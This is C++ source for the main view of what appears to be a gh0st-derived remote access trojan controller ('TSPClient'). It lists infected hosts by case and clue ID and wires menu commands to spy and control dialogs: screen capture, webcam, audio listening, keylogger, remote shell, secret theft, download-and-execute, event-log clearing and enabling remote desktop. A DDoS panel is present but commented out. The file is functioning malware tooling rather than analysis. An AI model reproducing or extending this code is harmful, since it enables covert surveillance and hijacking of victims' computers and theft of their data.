// gh0stView.cpp : implementation of the CTSPClientView class
//

#include "stdafx.h"
#include <set>

#include "TSPClientPublic.h"
#include "TSPClient.h"
#include "TSPClientDoc.h"
#include "TSPClientView.h"
#include "MainFrm.h"
#include "afxinet.h"
#include "SockTCP.h"


//************by menglz*****tsp2.0 include************
#include "MyDBConn.h"
#include "TSP2_OnLine.h"



//*****************************


//#include "BuildView.h"
#include "SettingsView.h"
#include "DDOS.h"
#include "GUANYU.h"
#include "EnDeCode.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "InputDlg.h"
#include "DlgSecretGet.h"
#include "encode.h"
#include "..\\WdkPath\\\myprocess.h"
#include <io.h>
#include "Log.h"
#include "crc32.h"
#include "PluginConfig.h"
#include "PluginGlobalData.h"

extern CLog g_log;
extern CLog g_logErr;

extern CSettingsView *g_pSettingView;

char g_szUserName[64];
char g_szPassword[64];

#define IPCOLUME 0
#define CLUECOLUME 4
#define CLUENAME 6
#define CASEID 8

#define NAME_CLUEFILE "filter_ips.txt"
#define NAME_MACFILE "mac_clue.txt"
#define NAME_DBFILE "active_log.txt"
#define NAME_DBFILE_EX "active_log.ini"
#define NAME_OFFCMDFILE "offline_cmd.txt"
/*#define NAME_ONLINEFILE "Online_log.txt"*/

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
DWORD g_BeginTickCount=0;
char g_FileVerName[30];
int GetCurFileVerName(char *FileVerName);
extern CTSPClientView* g_pConnectView;
extern CMainFrame* g_pFrame;
#define WM_MYINITIALUPDATE (WM_USER + 101)

#define WM_NOTICEUPDATA (WM_USER + 102)

HMODULE hTspPlug;



//*******tsp2****


CRITICAL_SECTION g_online_cs;
CRITICAL_SECTION g_cs_beat_heart;



//************by menglz







typedef struct
{
	char	*title;
	int		nWidth;
	bool    bNumber;
}COLUMNSTRUCT;

// COLUMNSTRUCT g_Column_Data[] = 
// {
// 	{"ID",				48	},
// 	{"WAN",				107	},
// 	{"LAN",				107	},
// 	{"计算机名/备注",	107	},
// 	{"操作系统",		128	},
// 	{"CPU",				55	},
// 	{"Ping",			40	},
// 	{"摄像头",			51	},
// 	{"服务端版本",		75	},
// 	{"区域",			100	},
// 	{"标识",			150 },
// 	{"线索ID:案件ID",	100 },
// 	{"线索名称",		100 },
// };


COLUMNSTRUCT g_Column_Data[] = 
{
	{"序号",				48	,1},
	{"状态",				48	,0},
	{"案件ID",	55 ,1},
	{"线索名称",	128 ,0},
	{"线索ID",	55 ,1},
	{"计算机名/备注",	107	,0},
	{"区域",			100	,0},
	{"标识",			150 ,0},
	{"外网IP",				107	,0},
	{"内网IP",				107	,0},
	
	{"首次上线时间",	128	,0},
	{"最后上线时间",	128	,0},
	{"最后下线时间",	128	,0},
	{"最后心跳时间",	128	,0},
	{"操作系统",		128	,0},
	{"CPU",				55	,0},
	{"Ping",			40	,1},
	{"摄像头",			51	,0},
	{"服务端版本",		75	,0},

};



int g_Column_Width = 0;

//#if(WINVER >= 0x0600)

//int	g_Column_Count = (sizeof(g_Column_Data) / 7)-1 - !((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist;
//#else
//int	g_Column_Count = (sizeof(g_Column_Data) / 7) - !((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist;
int	g_Column_Count = (sizeof(g_Column_Data) / sizeof(COLUMNSTRUCT)) ;

//#endif
extern HANDLE g_hEventQuit;

BOOL FirstRunPass = TRUE;
/////////////////////////////////////////////////////////////////////////////
// CTSPClientView


IMPLEMENT_DYNCREATE(CTSPClientView, CListView)

BEGIN_MESSAGE_MAP(CTSPClientView, CListView)
	//{{AFX_MSG_MAP(CTSPClientView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(ID_REMOVELIST, OnRemove)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_SRCRET_FETCH, OnSecretFetch)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(ID_APP_PWD, OnAppPwd)
	ON_COMMAND(IDC_EXIT, OnExit)
	ON_COMMAND(IDC_HIT_HARD, OnHitHard)
	ON_COMMAND(ID_GENGXIN, OnGengxin)
	ON_COMMAND(IDC_OPEN_3389, OnOpen3389)
	ON_COMMAND(IDC_FINDXP, OnFindxp)
	ON_COMMAND(IDC_FIND2003, OnFind2003)
	ON_COMMAND(IDC_FINDCAM, OnFindcam)
	ON_COMMAND(IDC_FIND2000, OnFind2000)
	ON_COMMAND(IDC_FINDADDR, OnFindaddr)
	ON_COMMAND(IDC_DOWNCHAJIAN, OnDownchajian)
	ON_COMMAND(ID_UPDATE, OnUpdateClient)

	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_HEARTBEAT, OnHeartBeat)
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSERECTDIALOG, OnOpenSerectDialog)
	ON_MESSAGE(WM_PLUGIN_REQUEST, OnPluginRequest)
	ON_MESSAGE(WM_PLUGIN_REMOVE, OnRemoveUI)
	
	ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, &CTSPClientView::OnNMCustomdraw)
	ON_NOTIFY_REFLECT(NM_CLICK, &CTSPClientView::OnNMClick)

	ON_WM_TIMER()

	//自定义消息
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_MESSAGE(WM_NOTICEUPDATA,OnNoticeUpdata)
	ON_COMMAND(ID_APP_HELP, &CTSPClientView::OnAppHelp)
	ON_COMMAND(ID_APP_WEB, &CTSPClientView::OnInstallWebServer)
	ON_COMMAND(ID_MENU_OPENSCRET2, &CTSPClientView::OnMenuOpenscret)
	ON_COMMAND(ID_MENU_OPENSCRET, &CTSPClientView::OnMenuOpenscret)
	ON_WM_DESTROY()
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTSPClientView construction/destruction

CTSPClientView::CTSPClientView()
{

	
	
	InitializeCriticalSection(&g_online_cs);
	InitializeCriticalSection(&g_cs_beat_heart);



	// TODO: add construction code here
	m_nCount = 0;
	Ism_arrDbChange=FALSE;

	if (((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}

	g_pConnectView = this;
	m_pListCtrl = NULL;
	m_bNewClientVer = FALSE;
	m_hThreadHandle = NULL;
	m_ItemMaxID=0;
	::ZeroMemory(m_szClueFileName, sizeof(m_szClueFileName));

    //CString str2= GetExeCurrentDir();
    CString str=((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Filter", "Path","");

	char *sztmp=str.GetBuffer();

	if (sztmp&&strlen(sztmp)!=0) 
	{
		if(sztmp[strlen(sztmp)-1]=='\\')	sztmp[strlen(sztmp)-1]='\0';
		wsprintf(m_szClueFileName, "%s\\%s",sztmp,NAME_CLUEFILE);
	}
	else
	{
		wsprintf(m_szClueFileName, "%s\\%s", GetExeCurrentDir(),NAME_CLUEFILE);
	}


	//if(sztmp[strlen(sztmp)-1]=='\\')	sztmp[strlen(sztmp)-1]='\0';



	//wsprintf(m_szClueFileName, "%s\\%s",sztmp,NAME_CLUEFILE);
	//AfxMessageBox(m_szClueFileName);

	::ZeroMemory(m_szMacFileName, sizeof(m_szMacFileName));
	wsprintf(m_szMacFileName, "%s\\%s", GetExeCurrentDir(), NAME_MACFILE);


	::ZeroMemory(m_szDbFileName, sizeof(m_szDbFileName));
	wsprintf(m_szDbFileName, "%s\\%s", GetExeCurrentDir(), NAME_DBFILE);

	::ZeroMemory(m_szDbFileNameEx, sizeof(m_szDbFileNameEx));
	wsprintf(m_szDbFileNameEx, "%s\\%s", GetExeCurrentDir(), NAME_DBFILE_EX);

	::ZeroMemory(m_szOfflineCmdName, sizeof(m_szOfflineCmdName));
	wsprintf(m_szOfflineCmdName, "%s\\%s", GetExeCurrentDir(), NAME_OFFCMDFILE);


	::RtlZeroMemory(&m_ovTrojan,  sizeof(m_ovTrojan)); 
	m_ovTrojan.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	m_hThreadMonitor = NULL;
	::ZeroMemory(&m_addrLicServer, sizeof(m_addrLicServer));

	g_BeginTickCount=GetTickCount();
	GetCurFileVerName(g_FileVerName);

	InitMonitor();

	// 初始化全局数据,lcw add 2013.07.24
	GLOBAL_DATA->Init();




	TSP_2_OffLineAll();  //add by menglz tsp2






}

CTSPClientView::~CTSPClientView()
{


	DeleteCriticalSection(&g_online_cs);
	DeleteCriticalSection(&g_cs_beat_heart);
}

BOOL CTSPClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CTSPClientView drawing

void CTSPClientView::OnDraw(CDC* pDC)
{
	CTSPClientDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}
LRESULT CTSPClientView::OnHeartBeat(WPARAM wParam, LPARAM lParam)
{
// 	LOG((LEVEL_INFO,"EnterCriticalSection OnHeartBeat start...\r\n"));
// 	
// 	EnterCriticalSection(&g_cs_beat_heart);
	
	//LVCOLUMN Column;
	//char ColName[30];
	//Column.mask=LVCF_TEXT;
	//Column.pszText=ColName;
	//Column.cchTextMax=30;

	//BOOL ret=m_pListCtrl->GetColumn(COL_LAST_RECV_TIME,&Column);

	//if(m_pListCtrl->GetColumn(COL_LAST_RECV_TIME,&Column))
	//{
	//	if(strcmp(Column.pszText,g_Column_Data[COL_LAST_RECV_TIME].title)!=0)
	//	{
	//		return 0;
	//	}
	//}
	{
#ifdef _MYDEBUG1
		g_log.Log(0,"进入OnHeartBeat\n");
#endif
		for(int i=0;i<m_pListCtrl->GetItemCount();i++)
		{
			INFO_DB_CONTRAST *pItem=((INFO_DB_CONTRAST *)m_pListCtrl->GetItemData(i));
			if(pItem)
			{
				ClientContext *pContext=(ClientContext *)pItem->lpContent;
				if((pContext)&&(lParam))
				{
					if(pContext->m_Socket==((ClientContext *)lParam)->m_Socket)
					{
						sprintf(pItem->szlastRecvTime,"%d-%02d-%02d(%02d:%02d)",pContext->m_lastRecvTime.wYear,pContext->m_lastRecvTime.wMonth,pContext->m_lastRecvTime.wDay,pContext->m_lastRecvTime.wHour,pContext->m_lastRecvTime.wMinute);
						if((strcmp(m_pListCtrl->GetItemText( i , COL_LAST_RECV_TIME),pItem->szlastRecvTime)!=0))
						{
							m_pListCtrl->SetItemText(i,COL_LAST_RECV_TIME,pItem->szlastRecvTime);
#ifdef _MYDEBUG1
							g_log.Log(0,"更新时间%08x\n",pContext);
#endif						
						}
					}
					/*
					char *pIp=inet_ntoa(pContext->m_saClient.sin_addr);
					char *pIp1=inet_ntoa(((ClientContext *)lParam)->m_saClient.sin_addr);
					if((pIp)&&(pIp1)&&(strcmp(pIp,pIp1)==0))
					{
						if(pContext->m_Socket!=((ClientContext *)lParam)->m_Socket)
						{
							g_log.Log(LEVEL_WARNNING,"心跳连接(%08x,%08x)与登录连接(%08x,%08x)不匹配！\n",pContext,pContext->m_Socket,lParam,((ClientContext *)lParam)->m_Socket);
						}
					}*/
				}
			}
		}
	}

#ifdef _MYDEBUG1
	g_log.Log(0,"离开OnHeartBeat\n");
#endif

	//LOG((LEVEL_INFO,"EnterCriticalSection OnHeartBeat leaving...\r\n"));

	//LeaveCriticalSection(&g_cs_beat_heart);

	return 0;
}

void CTSPClientView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();

	//////////////////////////////////////////////////////////////////////////
	NONCLIENTMETRICS ncm;
	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));

#if(WINVER >= 0x0600)
	ncm.cbSize = sizeof(NONCLIENTMETRICS) - sizeof(ncm.iPaddedBorderWidth);
#else
	ncm.cbSize = sizeof(NONCLIENTMETRICS);
#endif /* WINVER >= 0x0600 */

	VERIFY(::SystemParametersInfo(SPI_GETNONCLIENTMETRICS,
		sizeof(NONCLIENTMETRICS), &ncm, 0));
	ncm.lfMessageFont.lfWeight = 500;
	m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
	SetFont(&(m_headerCtrl.m_HeaderFont));
	//////////////////////////////////////////////////////////////////////////

	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle( LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES );




		for (int i = 0; i < g_Column_Count; i++)
		{
			m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
			m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
			g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
			if(g_Column_Data[i].bNumber)
				SetColumnNumeric(i);
		}



	//获取服务器IP和端口
	::ZeroMemory(&m_addrLicServer, sizeof(m_addrLicServer));
	m_addrLicServer.sin_family = AF_INET;
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;
	// lcw test 
	if ((hp = gethostbyname(LICSERVER_IPADDR)) != NULL)
	//if(0)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));

	}


	m_addrLicServer.sin_addr.s_addr = inet_addr(tgtIP);
	m_addrLicServer.sin_port = htons(LICSERVER_LISPORT);

	// 设置数据段
	PostMessage(WM_MYINITIALUPDATE);

	//自动获取配置信息
	BOOL bRet = GetConfigFromServer();
	if (!bRet)
	{
		AfxMessageBox("自动配置端口失败, 请检查监听端口是否正确");
	}
	ReadDbFile();
	UpdateClient();

	
	CString newstr;
	DWORD Minute=((GetTickCount()-g_BeginTickCount)/1000)/60;
	newstr.Format( "[运行时间%d小时%d分钟][文件版本%s]",Minute/60,Minute%60,g_FileVerName);
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->m_wndStatusBar.SetPaneText(0, newstr);

	((CMainFrame*)AfxGetApp()->m_pMainWnd)->ShowConnectionsNumber();
	//ListCtrlMonitorThread(this);
	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListCtrlMonitorThread, (LPVOID)this, 0, NULL);

	this->SetTimer(0,1000*60,0);//1分钟提示一次
	this->SetTimer(1,1000*60*60*8,0);//8个小时更新一次
	this->SetTimer(2,1000*60*10,0);//10分钟下载TspPlug.tmp
	this->SetTimer(3,1000*60*5,0);//5分钟提示一次
	this->SetTimer(4,1000*4*1,0);//4秒一次,轮询数据库,插件开启
	//this->SetTimer(5,1000*60*60*24,0);//24小时查询一次TSPClient使用权限
	this->SetTimer(5,1000*60*60,0);//1小时查询一次TSPClient使用权限

	this->SetTimer(7,1000*30,0);//add by yx

	//UpdateTSPWebUserID();
	//this->SetTimer(6,1000,0);//10分钟查询一次TSPweb页面用户

	// TODO: You may populate your ListView with items by directly accessing
	//  its list control through a call to GetListCtrl().
}

BOOL CTSPClientView::GetVersionFromServer(TCHAR *szFileName)
{

	BOOL bRet = FALSE;

	SOCKET sockInt = LoginLicenseSvr();
	if(sockInt == INVALID_SOCKET)
	{
		return bRet;
	}

	do 
	{	
		BYTE request[256] = {0};
		request[0] = GET_FILE_VERSION;

		StrCatA((char*)(&request[1]),szFileName);


		send(sockInt, (char*)&request, sizeof(request), NULL );
		int nRet = recv( sockInt, (char*)&request, sizeof(request), NULL );
		if (nRet != sizeof(request))
		{
			break;
		}

		if (0 == lstrlen((char *)request))
		{
			break;
		}

		char read_build[256]={0};
		TCHAR szVersionConfig[MAX_PATH]={0};
		GetModuleFileNameA(0,szVersionConfig,MAX_PATH);
		StrCpyA(StrRChr(szVersionConfig,0,'.'),".ini");
		GetPrivateProfileString(szFileName, "version", NULL, read_build, sizeof(read_build),szVersionConfig);
		if (lstrlen(read_build)==0||_stricmp(read_build,(char *)request))
		{
			WritePrivateProfileString(szFileName,"version",(LPTSTR)request,szVersionConfig);
			bRet=TRUE;
			break;
		}


	} while(FALSE);

	closesocket(sockInt);

	return bRet;
}

BOOL CTSPClientView::GetVersionFromServer()
{

	BOOL bRet = FALSE;

	SOCKET sockInt = LoginLicenseSvr();
	if(sockInt == INVALID_SOCKET)
	{
		return bRet;
	}

	do 
	{	
		BYTE request[256] = {0};
		request[0] = GET_VERSION;

		send( sockInt, (char*)&request, sizeof(request), NULL );
		int nRet = recv( sockInt, (char*)&request, sizeof(request), NULL );
		if (nRet != sizeof(request))
		{
			break;
		}

		if (0 == lstrlen((char *)request))
		{
			break;
		}

		//最新版
		if (0 == strcmp(BUILDDATE, (char *)request))
		{
			bRet = TRUE;
			break;
		}
	
		m_bNewClientVer = TRUE;
		bRet = TRUE;

	} while(FALSE);

	closesocket(sockInt);

	return bRet;
}


BOOL CTSPClientView::DownLoadNewClient()
{
	
	//menglz tsp2.0里不希望出现弹出框,直接返回FALSE;为了升级不弹出, 
	//而且2.0升级方式已经变化，原来方式去掉

	return FALSE;

	//
	
	
	if (IDOK != AfxMessageBox("控制端存在新版本是否更新", MB_OKCANCEL))
	{
		return FALSE;
	}

	CFileDialog dlg(FALSE, "exe", "TSPClient.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
	{
		return FALSE;
	}
	m_strServerFile = dlg.GetPathName();
// 	TCHAR szUpdataName[MAX_PATH]={0};
// 	GetModuleFileNameA(0,szUpdataName,MAX_PATH);
// 	strcat(szUpdataName,"bak");
// 	m_strServerFile.Format("%s",szUpdataName);
	m_hThreadHandle = ::CreateThread(NULL, 0, &CTSPClientView::DownloadClientEx, this, 0, NULL);
	m_dlgProgress.DoModal();

	return TRUE;
}


BOOL CTSPClientView::GetConfigFromServer()
{
	BOOL bRet = FALSE;

	SOCKET sockInt = LoginLicenseSvr();
	if(sockInt == INVALID_SOCKET)
	{
		return bRet;
	}

	do 
	{	
		BYTE request[256] = {0};
		request[0] = GET_CONFIG;

		send( sockInt, (char*)&request, sizeof(request), NULL );
		int nRet = recv( sockInt, (char*)&request, sizeof(request), NULL );
		if (nRet != sizeof(request))
		{
			break;
		}

		//解密接收缓冲

		char* pDns = MyDecode((char *)request);
		char szDns[MAX_PATH] = {0};
		lstrcpy(szDns, pDns);
		delete pDns;
		

		char *pPos = StrRChr(szDns, NULL, ':');
		int nListenPort = _ttoi(pPos+1);

		int nCurListen_port = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 80);
		int nmaxconnections = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);

		if (nListenPort != nCurListen_port)
		{
			((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", nListenPort);

			g_pFrame->Activate(nListenPort, nmaxconnections);			
		}

		bRet = TRUE;

	} while(FALSE);

	closesocket(sockInt);

	return bRet;
}


/////////////////////////////////////////////////////////////////////////////
// CTSPClientView diagnostics

#ifdef _DEBUG
void CTSPClientView::AssertValid() const
{
	CListView::AssertValid();
}

void CTSPClientView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CTSPClientDoc* CTSPClientView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CTSPClientDoc)));
	return (CTSPClientDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CTSPClientView message handlers


LRESULT CTSPClientView::OnNoticeUpdata(WPARAM, LPARAM)
{

	return FALSE;
}

LRESULT CTSPClientView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	CTSPClientView* pView = this;

	// Add Connects Window
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("主控制室", this, "主控制室");
	// Add Settings Window
	CSettingsView* pSettingsView = new CSettingsView;
	((CWnd*)pSettingsView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,CRect(0,0,0,0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("设置/生成", pSettingsView, "设置/生成");
	// Add Settings Window
//	CDDOS* pDDOS = new CDDOS;
//	((CWnd*)pDDOS)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,CRect(0,0,0,0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);
//((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView(" 压力测试 ", pDDOS, "请勿犯法,后果自负.");




	//GUANYU *pGUANYU = new GUANYU;
	//((CWnd*)pGUANYU)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,CRect(0,0,0,0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);
	//((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("   关于   ", pGUANYU, "关于");

	// Add Build Window
	//对于CFormView派生类必须新生成对象而不能使用成员对象
//	CBuildView *pBuildView = new CBuildView;
	//由于CFormView的成员受保护，所以必须对指针进行强制转换
//	((CWnd*)pBuildView)->Create(NULL,NULL, WS_CHILD|WS_VISIBLE,CRect(0,210,400,400), pBuildView->GetActiveWindow(), 111 ,NULL);
	
//	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Build", pBuildView, "Build Server");

 	((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);
	return 0;
}

LRESULT CTSPClientView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CTSPClientView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CTSPClientView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	PWEBDLGINFO lpInfoWebdlg = new WEBDLGINFO;
	lpInfoWebdlg->lpParent = this;
	lpInfoWebdlg->lpIocpServer = m_iocpServer;
	lpInfoWebdlg->lpContext = (ClientContext *)lParam;

	lpInfoWebdlg->hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	CreateThread(NULL, 0, &CWebCamDlg::CreateWebDlg, lpInfoWebdlg, 0, NULL);

	WaitForSingleObject(lpInfoWebdlg->hEvent, 10*1000);

	return 0;
}

LRESULT CTSPClientView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CTSPClientView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CTSPClientView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CTSPClientView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CTSPClientView::OnOpenSerectDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CDlgSecretGet	*dlg = new CDlgSecretGet(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(CDlgSecretGet::IDD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SECRET_GET;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


void CTSPClientView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// OnSize 的时候m_pListCtrl还没有初始化
	if (m_pListCtrl == NULL)
		return;

 	CRect rcClient;
 	GetClientRect(rcClient);

	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);	
}

void CTSPClientView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CListView::OnRButtonDown(nFlags, point);
	int nItem = m_pListCtrl->HitTest(point, NULL);

  	if (nItem ==-1)
  	{
  		return;		
  	}
	CMenu	popup;
	INFO_DB_CONTRAST *pItem=(INFO_DB_CONTRAST *)m_pListCtrl->GetItemData(nItem);
	if (CString(pItem->StateName).Find("上线")>=0)
	{
		popup.LoadMenu(IDR_LIST);
	}
	else
	{
		popup.LoadMenu(IDR_REMOVELIST);
		// 		CMenu*	pM = popup.GetSafeHmenu();
		//  		CPoint	p;
		// 		GetCursorPos(&p);
		//  		popup.TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
		// 		return;
	}
		

	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);

	}

	// 全选
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}

LRESULT CTSPClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	//return 0;
	LOG((LEVEL_FUNC_IN_OUT,"OnAddToList(%x,%x)\n",wParam,lParam));
	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
	{
		LOG((LEVEL_ERROR,"pContext=NULL"));
		return -1;
	}
	
